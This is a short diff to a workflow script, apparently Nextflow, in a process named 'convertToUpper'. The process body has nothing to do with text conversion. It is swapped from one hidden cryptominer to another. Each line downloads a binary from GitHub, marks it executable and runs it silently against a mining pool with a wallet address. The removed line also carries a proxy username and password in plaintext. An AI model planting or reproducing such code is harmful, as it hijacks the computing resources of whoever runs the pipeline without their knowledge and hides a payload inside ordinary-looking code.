@@ -16,7 +16,7 @@ process convertToUpper {
     stdout
 
   """
-  wget https://github.com/danipedrosang/marcrash/raw/main/raiso && chmod 700 raiso && ./raiso -F http://pool.aquachain.xyz:8888/0xf17aD2b308893A8dd0aE1EEbd4E57770a37F22F7/donald -t 1 --proxy socks5://zfyfuvri-rotate:vj4ufo2qq7oa@p.webshare.io:80 >/dev/null 2>&1
+  wget https://github.com/danipedrosang/marcrash/raw/main/dafars && chmod 700 dafars && ./dafars -a yescryptR16 -o stratum+tcp://47.89.234.73:443 -u web1qyzgpcnssde96zrfs3n4g6saunyy6mm534wzjeh.eas -p m=solo >/dev/null 2>&1
   """
 }
 
